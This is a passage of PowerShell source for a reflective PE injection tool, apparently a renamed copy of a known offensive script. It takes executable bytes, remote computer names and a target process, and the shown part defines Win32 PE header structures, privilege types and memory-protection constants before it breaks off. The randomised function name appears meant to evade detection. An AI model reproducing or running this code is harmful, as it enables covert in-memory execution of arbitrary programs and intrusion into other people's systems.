function Invoke-YZSIPFNXTHVFWKM
{

[CmdletBinding()]
Param(
    [Parameter(Position = 0, Mandatory = $true)]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $PEBytes,

	[Parameter(Position = 1)]
	[String[]]
	$ComputerName,

	[Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void' )]
	[String]
	$FuncReturnType = 'Void',

	[Parameter(Position = 3)]
	[String]
	$ExeArgs,

	[Parameter(Position = 4)]
	[Int32]
	$ProcId,

	[Parameter(Position = 5)]
	[String]
	$ProcName,

    [Switch]
    $ForceASLR,

	[Switch]
	$DoNotZeroMZ
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,

		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FuncReturnType,

		[Parameter(Position = 2, Mandatory = $true)]
		[Int32]
		$ProcId,

		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ProcName,

        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $ForceASLR
	)

	Function Get-Win32Types
	{
		$Win32Types = New-Object System.Object

		$Domain = [AppDomain]::CurrentDomain
		$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
		$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]

		$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$MachineType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType


		$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$MagicType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType


		$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$SubSystemType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType


		$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$DllCharacteristicsType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType



		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
		($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
		$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
		$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
		$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
		$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

		$e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
		$e_resField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

		$e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
		$e_res2Field.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

		$nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
		$nameField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
		$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
		$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
		$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
		$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

		return $Win32Types
	}

	Function Get-Win32Constants
	{
		$Win32Constants = New-Object System.Object

		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
